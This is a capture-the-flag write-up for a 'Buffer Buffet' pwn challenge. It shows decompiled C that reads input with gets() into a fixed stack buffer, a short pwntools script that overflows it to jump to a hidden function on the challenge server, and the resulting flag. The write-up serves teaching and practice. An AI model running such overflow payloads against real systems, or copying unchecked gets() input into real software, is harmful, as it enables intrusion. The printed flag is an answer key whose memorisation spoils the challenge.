# [Pwn] Buffer Buffet

## 📚 Overview

> *"As an elite hacker invited to an exclusive digital banquet, you must navigate through the layers of a complex software system. Among the appetizers, main course, and dessert lies a hidden entry point that, when discovered, reveals a treasure trove of sensitive information."*

## 🔎 *Reconnaissance*

Buffer overflow vulnerability.

```c
undefined8 vuln(void){
  char local_198 [400];
  
  puts("Enter some text:");
  gets(local_198);
  printf("You entered: %s\n",local_198);
  return 0;
}
```

## ✨ Solution

We can utilise [pwntools](https://github.com/Gallopsled/pwntools) for the exploitation.

```py
from pwn import *
elf = context.binary = ELF("./vuln", checksec=False)

# p = process('./vuln')
p = remote("34.125.199.248", 4056)

flag = p32(elf.symbols.secretFunction)
payload = b"A"*0x198 + flag

p.sendlineafter(b"Enter some text:", payload)
p.interactive()
```

For the payload, we will insert the padding first to fill the `local_198` var and then followed by the `secretFunction` address to overwrite the EIP (*instruction pointer*) so that the programme will execute the function, hence printing out the flag.

## 🏳️ Flag

`OSCTF{buff3r_buff3t_w4s_e4sy!}`